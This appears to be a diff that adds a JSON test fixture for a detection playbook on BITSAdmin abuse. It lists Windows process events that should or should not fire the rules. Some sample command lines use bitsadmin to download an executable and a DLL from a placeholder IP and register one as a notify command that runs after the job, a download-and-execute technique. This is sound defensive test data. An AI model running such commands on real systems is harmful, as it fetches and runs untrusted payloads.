@@ -1,0 +1,91 @@
+{
+ "playbook": "signal_bitsadmin_abuse",
+ "fires": [
+  {
+   "rule": "BITSAdmin Download",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 4688,
+      "windows.channel": "Security",
+      "NewProcessName": "C:\\Windows\\System32\\bitsadmin.exe",
+      "CommandLine": "bitsadmin /transfer job1 /download /priority high http://203.0.113.7/a.exe C:\\Users\\Public\\a.exe",
+      "SubjectUserName": "alice"
+     }
+    }
+   ]
+  },
+  {
+   "rule": "BITSAdmin Add File",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 1,
+      "windows.channel": "Microsoft-Windows-Sysmon/Operational",
+      "Image": "C:\\Windows\\System32\\bitsadmin.exe",
+      "CommandLine": "bitsadmin /addfile job1 http://203.0.113.7/b.dll C:\\ProgramData\\b.dll",
+      "User": "CORP\\alice"
+     }
+    }
+   ]
+  },
+  {
+   "rule": "BITSAdmin Create Job",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 4688,
+      "windows.channel": "Security",
+      "NewProcessName": "C:\\Windows\\System32\\bitsadmin.exe",
+      "CommandLine": "bitsadmin /create job1",
+      "SubjectUserName": "alice"
+     }
+    }
+   ]
+  },
+  {
+   "rule": "BITSAdmin Notify Command",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 4688,
+      "windows.channel": "Security",
+      "NewProcessName": "C:\\Windows\\System32\\bitsadmin.exe",
+      "CommandLine": "bitsadmin /SetNotifyCmdLine job1 C:\\ProgramData\\b.exe NULL",
+      "SubjectUserName": "alice"
+     }
+    }
+   ]
+  }
+ ],
+ "near_miss": [
+  {
+   "name": "bitsadmin listing jobs",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 4688,
+      "windows.channel": "Security",
+      "NewProcessName": "C:\\Windows\\System32\\bitsadmin.exe",
+      "CommandLine": "bitsadmin /list /allusers /verbose",
+      "SubjectUserName": "alice"
+     }
+    }
+   ]
+  },
+  {
+   "name": "other binary with a transfer flag",
+   "events": [
+    {
+     "fields": {
+      "windows.event_id": 4688,
+      "windows.channel": "Security",
+      "NewProcessName": "C:\\Windows\\System32\\robocopy.exe",
+      "CommandLine": "robocopy /transfer http://x C:\\a",
+      "SubjectUserName": "alice"
+     }
+    }
+   ]
+  }
+ ]
+}
